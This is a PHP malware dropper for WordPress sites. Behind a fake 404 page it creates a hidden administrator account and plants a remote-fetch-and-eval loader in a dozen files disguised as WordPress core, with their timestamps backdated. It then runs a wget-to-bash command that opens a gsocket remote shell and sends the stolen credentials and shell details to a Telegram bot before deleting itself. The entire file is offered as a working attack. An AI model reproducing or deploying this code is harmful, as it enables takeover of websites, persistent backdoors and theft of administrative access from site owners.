<?php  
// Memastikan akses hanya melalui query parameter "kontol"  
if (!isset($_GET['tbl'])) {  
    http_response_code(500); // Set HTTP response code to 500  
    echo '  
<!DOCTYPE html>  
<html style="height:100%">  
<head>  
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />  
<title> 404 Not Found  
</title></head>  
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">  
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">  
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>  
<h2 style="margin-top:20px;font-size: 30px;">Not Found  
</h2>  
<p>The resource requested could not be found on this server!</p>  
</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">  
<br>Proudly powered by  <a style="color:#fff;" href="http://www.litespeedtech.com/error-page">LiteSpeed Web Server</a><p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>  
';  
    exit; // Stop further execution  
}  

// Make gusion  
// Memastikan WordPress sudah dimuat  
define("WP_USE_THEMES", false);  
require "wp-blog-header.php";  

// Membuat pengguna admin baru  
$new_admin_username = "support";  
$new_admin_password = "tbl123@#$";  
$new_admin_email = "support-admin@" . $_SERVER["HTTP_HOST"];  

if (!username_exists($new_admin_username)) {  
    $user_id = wp_create_user(  
        $new_admin_username,  
        $new_admin_password,  
        $new_admin_email  
    );  

    $user = new WP_User($user_id);  
    $user->set_role("administrator");  

    echo "Admin baru berhasil dibuat:<br>";  
    echo $new_admin_username . " (USERNAME)<br>";  
    echo $new_admin_password . " (PASSWORD)<br>";  
    echo $new_admin_email . " (EMAIL)<br>";  
}  

// Konten yang akan ditulis ke dalam file  
$content =  
    '<?php $Url = "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/mx.php"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); echo eval("?>".$output); ?>';  

$file_paths = [  
    "./wp-includes/random_compat/random_bytes_bcrypt.php",  
    "./wp-admin/user/license.php",  
    "./wp-admin/includes/admin-action.php",  
    "./wp-admin/network/freedom.php",  
    "./wp-includes/rest-api/endpoints/class-wp-rest-api-controller.php",  
    "./wp-includes/SimplePie/Decode/HTML/Dentities.php",  
    "./wp-includes/blocks/navigation/view-modal.assets.php",  
    "./wp-includes/sodium_compat/namespaced/Hash.php",  
    "./wp-includes/style-engine/class-wp-style-engine-system.php",  
    "./wp-includes/php-compat/readsonly.php",  
    "./wp-includes/widgets/class-wp-nav-widgets.php",  
    "./wp-admin/maint/restore.php",  
];  

// Membuat file dan menulis konten  
foreach ($file_paths as $file_path) {  
    if (!is_dir(dirname($file_path))) {  
        mkdir(dirname($file_path), 0777, true);  
    }  

    file_put_contents($file_path, $content);  
    touch($file_path, filemtime("/etc/passwd"));  
}  

// Log file yang telah dibuat  
$log_message = "File Has Been Created ✅\n\n";  
foreach ($file_paths as $file_path) {  
    $log_message .=  
        "https://" .  
        $_SERVER["HTTP_HOST"] .  
        str_replace("./", "/", addslashes($file_path)) .  
        "\n";  
}  

// Menjalankan perintah shell dan menampung hasilnya ke variabel  
$command1 = shell_exec(  
    'bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"'  
);  

bot_token = "8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc";  

// Chat ID grup Anda  
$chat_id = "5070938778"; // Ganti dengan chat ID grup Anda  


// Membuat pesan yang akan dikirim, menggabungkan hasil dari perintah dan log file  
$message = "```\n【 URL  nya SEMPAI 】\n";  
$message .= "\n📝Admin Details\n\n";  
$message .= "👤Username: $new_admin_username\n";  
$message .= "🔑Password: $new_admin_password\n";  
$message .= "📧Email: $new_admin_email\n\n";  
$message .= "🔥Gusion: $command1\n";  
$message .= "Log File:\n" . addslashes($log_message) . "```"; // Escape log message  

// URL API Telegram  
$api_url = "https://api.telegram.org/bot$bot_token/sendMessage";  

// Data yang akan dikirim ke API  
$data = [  
    "chat_id" => $chat_id,  
    "text" => $message,  
    "parse_mode" => "MarkdownV2", // Menggunakan MarkdownV2 untuk format code block  
];  

// Menggunakan cURL untuk mengirim request POST ke API Telegram  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, $api_url);  
curl_setopt($ch, CURLOPT_POST, 1);  
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  

// Mendapatkan respons dari API  
$response = curl_exec($ch);  
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);  
curl_close($ch);  

// Cek apakah pesan berhasil dikirim  
if ($httpcode == 200) {  
    echo "Pesan berhasil dikirim!";  
} else {  
    echo "Gagal mengirim pesan: $response";  
}  

// Menghapus file skrip ini setelah eksekusi  
unlink(__FILE__);  
?>
